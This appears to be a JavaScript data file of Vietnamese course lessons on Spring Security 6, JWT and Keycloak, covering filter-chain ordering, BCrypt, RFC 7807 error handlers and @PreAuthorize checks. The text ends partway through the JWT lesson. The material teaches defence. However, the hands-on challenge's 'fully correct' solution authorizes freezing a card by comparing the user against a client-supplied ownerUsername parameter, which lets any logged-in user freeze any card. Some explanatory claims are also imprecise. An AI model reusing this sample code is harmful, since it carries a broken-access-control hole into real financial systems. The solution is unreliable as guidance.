/* MODULE 5 — Security: JWT, OAuth2, Keycloak */
window.COURSE_MODULES = window.COURSE_MODULES || [];
window.COURSE_MODULES.push({
  id: 5,
  title: "Security: JWT & Keycloak",
  subtitle: "Spring Security 6, OAuth2, Keycloak",
  icon: "🔐",
  desc: "Tích hợp Keycloak thực chiến: JWT, resource server, RBAC — đúng stack bạn đang làm ở LAAS.",
  lessons: [
    {
      id: "5-1",
      type: "lesson",
      title: "Spring Security 6 fundamentals",
      minutes: 50,
      content: `
## Spring Security 6 Fundamentals — FilterChain, AuthenticationManager & Kiến Trúc Bảo Mật Doanh Nghiệp

Trong thế giới kiến trúc phần mềm, bảo mật không phải là một "tính năng phụ" được chèn vào sau cùng; nó là bộ khung nền tảng bảo vệ toàn bộ tài sản dữ liệu của doanh nghiệp. Một lỗ hổng phân quyền nhỏ hoặc cấu hình sai lầm trong chuỗi bộ lọc an ninh có thể dẫn đến rò rỉ thông tin hàng triệu khách hàng, vi phạm pháp lý nghiêm trọng (GDPR, PCI-DSS) và hủy hoại danh tiếng của tổ chức.

Từ phiên bản Spring Boot 3.0 và Spring Security 6.0, toàn bộ các mô hình cấu hình kế thừa cũ (như <code>WebSecurityConfigurerAdapter</code>) đã bị loại bỏ hoàn toàn. Thay vào đó, Spring Security 6 áp dụng triết lý **Component-Based Security** với **Lambda DSL**, cơ chế xử lý ủy quyền hướng đối tượng và kiến trúc bất biến (Immutable Security Context).

Bài học này sẽ mổ xẻ tường tận cơ chế hoạt động bên dưới của **SecurityFilterChain**, luồng xác thực của **AuthenticationManager**, các thuật toán băm mật khẩu chuẩn quân sự, và cách xây dựng hệ thống bảo vệ đa tầng đạt chuẩn ngân hàng.

---

## 1. Cơ chế Ngầm của Chuỗi Bộ Lọc Bảo mật (Under the Hood)

### Sơ Đồ Mô Phỏng: Chuỗi Bộ Lọc Bảo Mật Spring Security 6 FilterChain

~~~mermaid
flowchart TD
    Req["Client Request"] --> DFP["DelegatingFilterProxy"]
    DFP --> FCP["FilterChainProxy"]
    FCP --> F1["1. SecurityContextHolderFilter (Nạp context từ session/MDC)"]
    F1 --> F2["2. CorsFilter (Kiểm tra W3C Preflight OPTIONS)"]
    F2 --> F3["3. CsrfFilter (Double Submit Cookie Check)"]
    F3 --> F4["4. BearerTokenAuthenticationFilter (Giải mã & Verify JWT)"]
    F4 --> F5["5. ExceptionTranslationFilter (Bắt 401 / 403)"]
    F5 --> F6["6. AuthorizationFilter (Kiểm tra Role/Authority RBAC)"]
    F6 --> Dispatcher["DispatcherServlet -> @RestController"]
    style F4 fill:#1f6feb,stroke:#388bfd,color:#fff
    style F6 fill:#238636,stroke:#2ea043,color:#fff
~~~


### DelegatingFilterProxy và FilterChainProxy

Spring Security tích hợp vào Servlet Container (như Apache Tomcat) thông qua một cầu nối duy nhất có tên là <code>DelegatingFilterProxy</code>:
1. **Servlet Container** quản lý các Filter chuẩn của Jakarta EE (<code>jakarta.servlet.Filter</code>), nhưng không biết gì về Spring IoC Container.
2. <code>DelegatingFilterProxy</code> là một Servlet Filter tiêu chuẩn được đăng ký vào Tomcat. Khi một HTTP Request đến, nó ủy quyền (Delegate) toàn bộ việc xử lý cho một Spring Bean có tên là <code>FilterChainProxy</code> (thường có tên bean là <code>springSecurityFilterChain</code>).
3. <code>FilterChainProxy</code> quản lý một danh sách các **SecurityFilterChain**. Nó duyệt qua từng chain và chọn ra chuỗi filter đầu tiên khớp với URL Request (dựa trên <code>RequestMatcher</code>).

~~~text
+-----------------------------------------------------------------------------------+
|                        SPRING SECURITY 6 ARCHITECTURE                             |
|                                                                                   |
|  HTTP Request                                                                     |
|       |                                                                           |
|       v                                                                           |
|  [Servlet Container (Tomcat Engine)]                                              |
|       |                                                                           |
|       v                                                                           |
|  [DelegatingFilterProxy] (Cầu nối Jakarta EE Filter -> Spring Bean)               |
|       |                                                                           |
|       v                                                                           |
|  [FilterChainProxy (springSecurityFilterChain)]                                   |
|       |                                                                           |
|       +---> SecurityFilterChain 1: matches("/api/v1/auth/**") -> No Security     |
|       |                                                                           |
|       +---> SecurityFilterChain 2: matches("/api/v1/admin/**")                   |
|       |     |                                                                     |
|       |     +-> [1. SecurityContextHolderFilter] (Khởi tạo SecurityContext)       |
|       |     +-> [2. HeaderWriterFilter] (Thêm HSTS, X-Content-Type-Options)       |
|       |     +-> [3. CorsFilter] (Kiểm tra Origin & Preflight OPTIONS)             |
|       |     +-> [4. CsrfFilter] (Kiểm tra token CSRF)                             |
|       |     +-> [5. BearerTokenAuthenticationFilter] (Trích xuất & Giải mã JWT)   |
|       |     +-> [6. ExceptionTranslationFilter] (Bắt lỗi 401 Unauthorized / 403)  |
|       |     +-> [7. AuthorizationFilter] (Kiểm tra quyền Role / Authority)        |
|       |                                                                           |
|       v                                                                           |
|  [DispatcherServlet] ---> Controller Handler Execution                            |
+-----------------------------------------------------------------------------------+
~~~

### Thứ tự Bộ lọc Bắt buộc & Vai trò Cốt tử:
- **SecurityContextHolderFilter**: Nạp đối tượng <code>SecurityContext</code> từ <code>SecurityContextRepository</code> (hoặc tạo mới context rỗng cho request stateless).
- **CorsFilter**: Phải chạy TRƯỚC mọi filter xác thực để các HTTP Request dạng Preflight (OPTIONS) được phản hồi ngay lập tức mà không bị chặn bởi bộ lọc đăng nhập.
- **ExceptionTranslationFilter**: Lớp đệm quan trọng bắt các ngoại lệ bảo mật:
  - Nếu gặp <code>AuthenticationException</code>: Chuyển giao cho <code>AuthenticationEntryPoint</code> trả về mã HTTP **401 Unauthorized**.
  - Nếu gặp <code>AccessDeniedException</code>: Chuyển giao cho <code>AccessDeniedHandler</code> trả về mã HTTP **403 Forbidden**.
- **AuthorizationFilter**: Bộ lọc chốt chặn cuối cùng kiểm tra xem Principal hiện tại có đủ quyền hạn (GrantedAuthorities) để truy cập URL hay không.

---

## 2. Kiến trúc Xác thực: AuthenticationManager & ProviderManager

Khi người dùng gửi thông tin đăng nhập (Username/Password hoặc Token), Spring Security sử dụng mô hình thiết kế Strategy thông qua interface <code>AuthenticationManager</code>:

~~~text
+-----------------------------------------------------------------------------------+
|                        AUTHENTICATION MANAGER & PROVIDERS                         |
|                                                                                   |
|  Unauthenticated Authentication Token (e.g., UsernamePasswordAuthenticationToken) |
|       |                                                                           |
|       v                                                                           |
|  [ProviderManager (triển khai của AuthenticationManager)]                          |
|       |                                                                           |
|       +---> Duyệt qua danh sách AuthenticationProvider:                           |
|       |                                                                           |
|       +---> 1. DaoAuthenticationProvider:                                         |
|       |        - Gọi UserDetailsService.loadUserByUsername()                      |
|       |        - Gọi PasswordEncoder.matches(rawPassword, encodedPassword)        |
|       |        - Nếu thành công -> Trả về Authenticated Token kèm Authorities     |
|       |                                                                           |
|       +---> 2. JwtAuthenticationProvider (dành cho OAuth2/JWT)                    |
|       +---> 3. LdapAuthenticationProvider (dành cho mạng nội bộ doanh nghiệp)    |
|       |                                                                           |
|       v                                                                           |
|  Ghi nhận Authenticated Token vào SecurityContextHolder.getContext()              |
+-----------------------------------------------------------------------------------+
~~~

### Chuẩn hóa Băm Mật khẩu: BCrypt, Argon2id vs PBKDF2

Tuyệt đối không bao giờ sử dụng MD5, SHA-1 hay SHA-256 thuần để lưu mật khẩu trong cơ sở dữ liệu. Các thuật toán này được thiết kế để tính toán cực nhanh, cho phép hacker sử dụng phần cứng GPU hiện đại để thử hàng tỷ mật khẩu mỗi giây (Brute-force qua Rainbow Tables).

Spring Security cung cấp <code>PasswordEncoder</code> với các thuật toán thích ứng (Adaptive Slow Hashing):
1. **BCrypt (Khuyên dùng mặc định)**: Sử dụng thuật toán băm Blowfish có độ phức tạp (Work Factor / Cost) điều chỉnh được. Chuẩn sản xuất tối thiểu nên đặt <code>strength = 12</code> (mất khoảng 250ms cho mỗi lần băm, làm tê liệt các cuộc tấn công brute-force).
2. **Argon2id (Chuẩn tối thượng)**: Đạt giải nhất cuộc thi Password Hashing Competition (PHC). Argon2id chống lại cả tấn công GPU và phần cứng chuyên dụng ASIC nhờ kiểm soát cả bộ nhớ RAM (Memory-hard) và số luồng xử lý.

---

## 3. Triển khai Production-Grade: Hệ thống Bảo Mật Đa Tầng Chuẩn Ngân Hàng

Chúng ta sẽ thiết kế một cấu hình bảo mật hoàn chỉnh bằng Spring Security 6 với các tiêu chuẩn khắt khe:
1. <code>SecurityFilterChain</code> tách biệt:
   - Chuỗi 1: <code>/api/v1/auth/**</code>, Swagger UI và Actuator Health hoàn toàn công khai (Permit All).
   - Chuỗi 2: <code>/api/v1/admin/**</code> bắt buộc Role <code>ADMIN</code> và yêu cầu xác thực bảo mật cao.
   - Chuỗi 3: <code>/api/v1/**</code> bảo vệ toàn diện các API nghiệp vụ thông thường.
2. Xử lý ngoại lệ chuẩn RFC 7807 ProblemDetails cho cả **401 Unauthorized** và **403 Forbidden**.
3. Cấu hình bảo mật phương thức phân cấp (Method-Level Security với <code>@EnableMethodSecurity</code>).

### 3.1. Custom AuthenticationEntryPoint & AccessDeniedHandler (Chuẩn RFC 7807)

~~~java
package com.bank.security.handler;

import com.fasterxml.jackson.databind.ObjectMapper;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.web.AuthenticationEntryPoint;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.net.URI;
import java.time.Instant;
import java.util.LinkedHashMap;
import java.util.Map;

@Component
@RequiredArgsConstructor
@Slf4j
public class ProblemDetailsAuthenticationEntryPoint implements AuthenticationEntryPoint {

    private final ObjectMapper objectMapper;

    @Override
    public void commence(HttpServletRequest request, HttpServletResponse response,
                         AuthenticationException authException) throws IOException {
        log.warn("Unauthorized access attempt to URI: {} from IP: {}, error: {}",
            request.getRequestURI(), request.getRemoteAddr(), authException.getMessage());

        response.setStatus(HttpStatus.UNAUTHORIZED.value());
        response.setContentType(MediaType.APPLICATION_PROBLEM_JSON_VALUE);

        Map<String, Object> problem = new LinkedHashMap<>();
        problem.put("type", "https://api.bank.com/errors/unauthorized");
        problem.put("title", "Unauthorized");
        problem.put("status", HttpStatus.UNAUTHORIZED.value());
        problem.put("detail", "Full authentication is required to access this resource: " + authException.getMessage());
        problem.put("instance", request.getRequestURI());
        problem.put("timestamp", Instant.now().toString());

        response.getWriter().write(objectMapper.writeValueAsString(problem));
    }
}
~~~

~~~java
package com.bank.security.handler;

import com.fasterxml.jackson.databind.ObjectMapper;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.security.web.access.AccessDeniedHandler;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.time.Instant;
import java.util.LinkedHashMap;
import java.util.Map;

@Component
@RequiredArgsConstructor
@Slf4j
public class ProblemDetailsAccessDeniedHandler implements AccessDeniedHandler {

    private final ObjectMapper objectMapper;

    @Override
    public void handle(HttpServletRequest request, HttpServletResponse response,
                       AccessDeniedException accessDeniedException) throws IOException {
        log.warn("Access denied for principal to URI: {}, error: {}",
            request.getRequestURI(), accessDeniedException.getMessage());

        response.setStatus(HttpStatus.FORBIDDEN.value());
        response.setContentType(MediaType.APPLICATION_PROBLEM_JSON_VALUE);

        Map<String, Object> problem = new LinkedHashMap<>();
        problem.put("type", "https://api.bank.com/errors/forbidden");
        problem.put("title", "Forbidden");
        problem.put("status", HttpStatus.FORBIDDEN.value());
        problem.put("detail", "You do not have the required permissions to access this endpoint");
        problem.put("instance", request.getRequestURI());
        problem.put("timestamp", Instant.now().toString());

        response.getWriter().write(objectMapper.writeValueAsString(problem));
    }
}
~~~

---

### 3.2. Cấu hình SecurityFilterChain Đa Tầng (Spring Security 6 Lambda DSL)

~~~java
package com.bank.security.config;

import com.bank.security.handler.ProblemDetailsAccessDeniedHandler;
import com.bank.security.handler.ProblemDetailsAuthenticationEntryPoint;
import lombok.RequiredArgsConstructor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.annotation.Order;
import org.springframework.http.HttpMethod;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
@EnableWebSecurity
@EnableMethodSecurity(prePostEnabled = true, securedEnabled = true)
@RequiredArgsConstructor
public class EnterpriseSecurityConfiguration {

    private final ProblemDetailsAuthenticationEntryPoint authenticationEntryPoint;
    private final ProblemDetailsAccessDeniedHandler accessDeniedHandler;

    // FilterChain 1: Các Endpoint công khai hoàn toàn (Public & Docs)
    @Bean
    @Order(1)
    public SecurityFilterChain publicEndpointsFilterChain(HttpSecurity http) throws Exception {
        return http
            .securityMatcher(
                "/api/v1/auth/**",
                "/actuator/health",
                "/actuator/info",
                "/v3/api-docs/**",
                "/swagger-ui/**",
                "/swagger-ui.html"
            )
            .csrf(AbstractHttpConfigurer::disable)
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth.anyRequest().permitAll())
            .build();
    }

    // FilterChain 2: Quản trị viên (Admin Backoffice)
    @Bean
    @Order(2)
    public SecurityFilterChain adminEndpointsFilterChain(HttpSecurity http) throws Exception {
        return http
            .securityMatcher("/api/v1/admin/**")
            .csrf(AbstractHttpConfigurer::disable)
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers(HttpMethod.DELETE, "/api/v1/admin/**").hasAuthority("SCOPE_admin:delete")
                .anyRequest().hasRole("ADMIN")
            )
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint(authenticationEntryPoint)
                .accessDeniedHandler(accessDeniedHandler)
            )
            .build();
    }

    // FilterChain 3: Toàn bộ API nghiệp vụ khách hàng thông thường (Default Chain)
    @Bean
    @Order(3)
    public SecurityFilterChain defaultBusinessFilterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(AbstractHttpConfigurer::disable)
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers(HttpMethod.GET, "/api/v1/products/**").permitAll()
                .requestMatchers("/api/v1/payments/**").hasAnyRole("CUSTOMER", "MERCHANT")
                .anyRequest().authenticated()
            )
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint(authenticationEntryPoint)
                .accessDeniedHandler(accessDeniedHandler)
            )
            .build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        // BCrypt với strength = 12 (Chuẩn an toàn bảo vệ mật khẩu ngân hàng)
        return new BCryptPasswordEncoder(12);
    }

    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }
}
~~~

---

### 3.3. Method-Level Security với Custom SpEL Permission Evaluator

Ngoài việc bảo vệ ở tầng URL (Request Matchers), Spring Security cho phép kiểm soát quyền chi tiết đến từng bản ghi (Fine-grained Authorization) thông qua annotation <code>@PreAuthorize</code>:

~~~java
package com.bank.security.service;

import org.springframework.security.core.Authentication;
import org.springframework.stereotype.Component;

@Component("accountSecurityService")
public class AccountSecurityService {

    /**
     * Kiểm tra xem người dùng hiện tại có phải là chủ sở hữu của số tài khoản này không.
     */
    public boolean isAccountOwner(Authentication authentication, String accountNumber) {
        if (authentication == null || !authentication.isAuthenticated()) {
            return false;
        }

        // Quyền ADMIN có thể truy xuất mọi tài khoản
        boolean isAdmin = authentication.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"));
        if (isAdmin) {
            return true;
        }

        String loggedInUsername = authentication.getName();
        // Giả lập kiểm tra liên kết chủ sở hữu giữa username và accountNumber
        return loggedInUsername.equalsIgnoreCase("cust_" + accountNumber);
    }
}
~~~

~~~java
package com.bank.account.controller;

import com.bank.security.service.AccountSecurityService;
import lombok.RequiredArgsConstructor;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.math.BigDecimal;

@RestController
@RequestMapping("/api/v1/accounts")
@RequiredArgsConstructor
public class AccountController {

    // CHỈ CHO PHÉP CHỦ TÀI KHOẢN HOẶC ADMIN TRUY CẬP SỐ DƯ
    @GetMapping("/{accountNumber}/balance")
    @PreAuthorize("@accountSecurityService.isAccountOwner(authentication, #accountNumber)")
    public ResponseEntity<AccountBalanceDto> getBalance(@PathVariable String accountNumber) {
        return ResponseEntity.ok(new AccountBalanceDto(accountNumber, new BigDecimal("15450.75"), "VND"));
    }

    public record AccountBalanceDto(String accountNumber, BigDecimal balance, String currency) {}
}
~~~

---

## 4. Kiểm thử Thực tế & Xác thực cURL (cURL & Verification)

### Kiểm thử Truy cập Không có Token (Nhận lỗi 401 ProblemDetails)

~~~bash
curl -X GET http://localhost:8080/api/v1/accounts/10099/balance \
  -H "Accept: application/problem+json"
~~~

Response Headers & JSON Body:
~~~json
HTTP/1.1 401 Unauthorized
Content-Type: application/problem+json
Date: Sat, 03 Oct 2026 11:45:00 GMT

{
  "type": "https://api.bank.com/errors/unauthorized",
  "title": "Unauthorized",
  "status": 401,
  "detail": "Full authentication is required to access this resource: An Authentication object was not found in the SecurityContext",
  "instance": "/api/v1/accounts/10099/balance",
  "timestamp": "2026-10-03T11:45:00.104231Z"
}
~~~

### Kiểm thử Truy cập Sai Quyền (User cố tình truy cập tài khoản người khác - 403 Forbidden)

~~~bash
curl -X GET http://localhost:8080/api/v1/accounts/10099/balance \
  -H "Authorization: Bearer valid_token_of_cust_55555" \
  -H "Accept: application/problem+json"
~~~

Response Headers & JSON Body:
~~~json
HTTP/1.1 403 Forbidden
Content-Type: application/problem+json
Date: Sat, 03 Oct 2026 11:46:12 GMT

{
  "type": "https://api.bank.com/errors/forbidden",
  "title": "Forbidden",
  "status": 403,
  "detail": "You do not have the required permissions to access this endpoint",
  "instance": "/api/v1/accounts/10099/balance",
  "timestamp": "2026-10-03T11:46:12.894102Z"
}
~~~

---

## 5. Production Pitfalls & Post-mortems Thực chiến

### Post-mortem 1: Sai Thứ tự SecurityFilterChain làm Hổng Lỗ hổng Bảo mật Toàn Diện

- **Triệu chứng**: Kỹ sư khai báo 2 Bean <code>SecurityFilterChain</code>: một chain cho toàn bộ hệ thống (<code>anyRequest()</code>) và một chain riêng cho <code>/api/v1/admin/**</code>. Sau khi deploy, bất kỳ ai cũng có thể truy cập vào các API của Admin mà không cần đăng nhập!
- **Nguyên nhân cốt lõi**:
  <code>FilterChainProxy</code> duyệt danh sách các chuỗi bộ lọc theo thứ tự của annotation <code>@Order</code>.
  - Nếu chain mặc định (bắt <code>/**</code>) có <code>@Order(1)</code> và cho phép truy cập, request tới <code>/api/v1/admin/users</code> khớp ngay với chain 1 này và được bỏ qua xác thực! Chain 2 dành cho Admin vĩnh viễn không bao giờ được chạm tới.
- **Quy tắc Vàng**: **Luôn luôn sắp xếp từ Cụ thể nhất (Specific Matchers) đến Tổng quát nhất (Catch-all Matchers)**. Chuỗi bộ lọc chứa các điều kiện chặt chẽ (Admin, Private) phải có <code>@Order</code> nhỏ hơn chuỗi bộ lọc công khai hoặc mặc định.

### Post-mortem 2: Thất thoát SecurityContext khi sử dụng Java 21 Virtual Threads

- **Triệu chứng**: Khi chuyển sang sử dụng Java 21 Virtual Threads (<code>spring.threads.virtual.enabled=true</code>), các tác vụ xử lý nền hoặc gọi API nội bộ bị mất thông tin đăng nhập, <code>SecurityContextHolder.getContext().getAuthentication()</code> trả về <code>null</code>.
- **Nguyên nhân cốt lõi**:
  Mặc định, <code>SecurityContextHolder</code> sử dụng chiến lược <code>MODE_THREADLOCAL</code>. Với Virtual Threads, hàng triệu luồng ảo được tạo ra và gán động vào một nhóm nhỏ Platform Carrier Threads. Việc chia sẻ hoặc truyền thừa kế <code>ThreadLocal</code> qua Virtual Threads bị giới hạn nghiêm ngặt bởi JVM để tránh rò rỉ bộ nhớ.
- **Giải pháp**:
  Tránh sử dụng <code>MODE_INHERITABLETHREADLOCAL</code> với Virtual Threads. Thay vào đó, sử dụng cơ chế **Concurrency Decorator** chính thống của Spring:
  ~~~java
  DelegatingSecurityContextExecutorService executor =
      new DelegatingSecurityContextExecutorService(Executors.newVirtualThreadPerTaskExecutor());
  ~~~

---

## 6. Hands-on Challenge & Lời giải Hoàn chỉnh 100%

### Đề bài Thách thức Kỹ sư
Hệ thống Thẻ Doanh nghiệp (Corporate Card Management) cần thiết lập hàng rào bảo mật kép:
1. Tạo <code>SecurityFilterChain</code> thỏa mãn:
   - Các API xuất báo cáo tài chính <code>/api/v1/reports/**</code> bắt buộc phải có Role <code>FINANCE_CONTROLLER</code>.
   - Thao tác khóa thẻ khẩn cấp <code>POST /api/v1/cards/{cardId}/freeze</code> chỉ cho phép:
     a) Chính chủ sở hữu chiếc thẻ đó (so khớp <code>card.ownerUsername == authentication.name</code>), HOẶC
     b) Người dùng có quyền <code>ROLE_CARD_FRAUD_OFFICER</code>.
2. Xây dựng Custom SpEL Evaluator và cấu hình Spring Security 6 hoàn chỉnh không thiếu một dòng code.

---

### Lời giải Mẫu Hoàn chỉnh (100% Compilable Enterprise Code)

~~~java
package com.bank.corporate.service;

import org.springframework.security.core.Authentication;
import org.springframework.stereotype.Component;

import java.util.Objects;

@Component("corporateSecurityEvaluator")
public class CorporateSecurityEvaluator {

    public boolean canFreezeCard(Authentication authentication, String cardOwnerUsername) {
        if (authentication == null || !authentication.isAuthenticated()) {
            return false;
        }

        // Quyền nhân viên chống gian lận thẻ có thể khóa mọi thẻ
        boolean isFraudOfficer = authentication.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_CARD_FRAUD_OFFICER"));
        if (isFraudOfficer) {
            return true;
        }

        // Chủ thẻ tự khóa thẻ của chính mình
        return Objects.equals(authentication.getName(), cardOwnerUsername);
    }
}
~~~

~~~java
package com.bank.corporate.controller;

import com.bank.corporate.service.CorporateSecurityEvaluator;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/api/v1/cards")
@RequiredArgsConstructor
@Slf4j
public class CorporateCardController {

    @PostMapping("/{cardId}/freeze")
    @PreAuthorize("@corporateSecurityEvaluator.canFreezeCard(authentication, #ownerUsername)")
    public ResponseEntity<CardFreezeResponse> freezeCard(
            @PathVariable Long cardId,
            @RequestParam String ownerUsername) {

        log.info("Card {} frozen successfully by principal", cardId);
        return ResponseEntity.ok(new CardFreezeResponse(cardId, "FROZEN", "Card has been secured successfully"));
    }

    public record CardFreezeResponse(Long cardId, String status, String message) {}
}
~~~

:::takeaways
- **Cấu trúc SecurityFilterChain Bất biến**: Spring Security 6 loại bỏ hoàn toàn các class adapter cũ, chuyển sang Component-Based Configuration với Lambda DSL và Bean <code>SecurityFilterChain</code>.
- **Thứ tự @Order Của FilterChain Là Sống Còn**: Luôn cấu hình các URL matcher đặc thù có thứ tự ưu tiên cao hơn chuỗi mặc định để tránh việc quyền bảo vệ bị vô hiệu hóa ngầm.
- **Chuẩn hóa Thông Báo Lỗi RFC 7807**: Luôn triển khai cả <code>AuthenticationEntryPoint</code> (401) và <code>AccessDeniedHandler</code> (403) để trả về payload JSON có cấu trúc chuẩn quốc tế cho client.
- **Bảo mật Mật khẩu Cấp độ Ngân hàng**: Tuyệt đối không dùng SHA/MD5; sử dụng <code>BCryptPasswordEncoder(12)</code> hoặc <code>Argon2PasswordEncoder</code> để chống lại tấn công dò mật khẩu bằng phần cứng GPU.
- **Kiểm soát Quyền Chi tiết bằng SpEL**: Sử dụng <code>@PreAuthorize</code> kết hợp với các Spring Bean Evaluator để bảo vệ dữ liệu đến từng đối tượng cụ thể (Object-Level Authorization).
:::
`
    },
    {
      id: "5-2",
      type: "lesson",
      title: "JWT sâu: cấu trúc, signing, validation",
      minutes: 50,
      content: `
## JWT Sâu: Cấu Trúc, Ký Số, Validation & Refresh Token Rotation (RTR)

JSON Web Token (JWT — RFC 7519) là tiêu chuẩn công nghiệp thống trị toàn bộ kiến trúc xác thực của các hệ thống Microservices hiện đại. Tính chất tự chứa (Self-contained) và phi trạng thái (Stateless) cho phép hàng trăm dịch vụ phân tán xác minh danh tính người dùng mà không cần phải gọi ngược về cơ sở dữ liệu trung tâm để kiểm tra Session.

Tuy nhiên, phi trạng thái cũng là con dao hai lưỡi: nếu không hiểu tường tận các thuật toán ký số, cơ chế xoay vòng khóa (Key Rotation), các cuộc tấn công kinh điển như **"alg: none"**, hoặc không triển khai **Refresh Token Rotation (RTR)** kết hợp **Phát hiện tái sử dụng (Reuse Detection)**, hệ thống của bạn sẽ hoàn toàn bất lực khi token bị kẻ gian đánh cắp (Token Theft).

Bài học này sẽ đi sâu vào cấu trúc toán học của JWT, so sánh đối đầu giữa **Ký đối xứng (HMAC)** và **Ký bất đối xứng (RSA/EdDSA)**, và xây dựng một hệ thống quản lý Token hoàn chỉnh đạt chuẩn bảo mật tài chính.

---

## 1. Cấu Trúc Kỹ Thuật RFC 7519 & Lỗ Hổng Bảo Mật Kinh Điển (Under the Hood)

### Sơ Đồ Mô Phỏng: Refresh Token Rotation & Cơ Chế Phát Hiện Đánh Cắp Token (Reuse Detection)

~~~mermaid
sequenceDiagram
    autonumber
    actor User as Người dùng hợp lệ
    actor Thief as Kẻ trộm (Token Thief)
    participant Auth as Keycloak / Spring Auth Server
    participant Redis as Token Family Store
    
    User->>Auth: Đổi Token: POST /refresh (Token_A)
    Auth->>Redis: Kiểm tra Token_A hợp lệ
    Auth-->>User: Cấp Token_B mới (Đánh dấu Token_A = USED)
    
    Note over Thief: Kẻ trộm đã nghe lén được Token_A cũ!
    Thief->>Auth: Cố tình dùng lại: POST /refresh (Token_A)
    Auth->>Redis: Phát hiện Token_A ĐÃ BỊ SỬ DỤNG TRƯỚC ĐÓ!
    Note over Auth: CẢNH BÁO TẤN CÔNG (REUSE DETECTION)!
    Auth->>Redis: XÓA SẠCH toàn bộ Token Family của User!
    Auth-->>Thief: HTTP 401 Unauthorized (Bị chặn!)
    
    User->>Auth: Lần sau User gửi Token_B
    Auth-->>User: Bị từ chối vì Token Family đã bị thu hồi do cảnh báo an ninh -> Bắt đăng nhập lại!
~~~


### Giải phẫu 3 Phần của JWT

Một chuỗi JWT gồm 3 phân đoạn Base64URL được ngăn cách bởi dấu chấm (<code>.</code>):

~~~text
+-----------------------------------------------------------------------------------+
|                           GIẢI PHẪU CẤU TRÚC JSON WEB TOKEN                       |
|                                                                                   |
|  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InJzYS0yMDI2LXYxIn0                  |
|  .                                                                                |
|  eyJzdWIiOiJjdXN0LTEwMDkiLCJyb2xlcyI6WyJDUkVESVRfT0ZGSUNFUiJdLCJleHAiOjE3OTEw...  |
|  .                                                                                |
|  dBjftJeZ4CVP-8BgnQ0q91k... (Chữ ký số mật mã học Cryptographic Signature)        |
+-----------------------------------------------------------------------------------+
~~~

1. **Header (Tiêu đề)**: Chứa siêu dữ liệu về thuật toán mã hóa:
   - <code>alg</code>: Thuật toán ký số (ví dụ: <code>RS256</code>, <code>HS256</code>).
   - <code>typ</code>: Loại token (<code>JWT</code>).
   - <code>kid</code> (Key ID): Định danh cặp khóa được sử dụng để ký token, phục vụ việc xoay vòng khóa không gián đoạn (Zero-Downtime Key Rotation).
2. **Payload (Thân thông điệp — Claims)**:
   - **Registered Claims (Chuẩn quốc tế)**:
     - <code>sub</code> (Subject): Định danh người dùng duy nhất (User ID / UUID).
     - <code>iss</code> (Issuer): Cơ quan cấp phát token (ví dụ: <code>https://auth.bank.com</code>).
     - <code>aud</code> (Audience): Đối tượng dịch vụ được phép nhận token (ví dụ: <code>bank-api</code>).
     - <code>exp</code> (Expiration Time): Thời điểm hết hạn (Unix Timestamp tính bằng giây).
     - <code>iat</code> (Issued At): Thời điểm tạo token.
     - <code>jti</code> (JWT ID): Mã định danh duy nhất ngẫu nhiên của token (chống tấn công Replay và phục vụ Blacklist).
   - **Custom Claims**: Dữ liệu nghiệp vụ tùy biến (<code>roles</code>, <code>email</code>, <code>tenantId</code>).
3. **Signature (Chữ ký số)**: Đảm bảo tính toàn vẹn (Integrity) và chống làm giả (Tamper-proof).

### Ký Đối Xứng (HMAC-SHA256) vs Ký Bất Đối Xứng (RSA-256 / Ed25519)

Hơn 70% các khóa học Spring Boot cơ bản hướng dẫn dùng **HMAC-SHA256 (HS256)** với một chuỗi <code>secret</code> chia sẻ chung. Trong kiến trúc Microservices, đây là một lỗi thiết kế nghiêm trọng:

~~~text
+-----------------------------------------------------------------------------------+
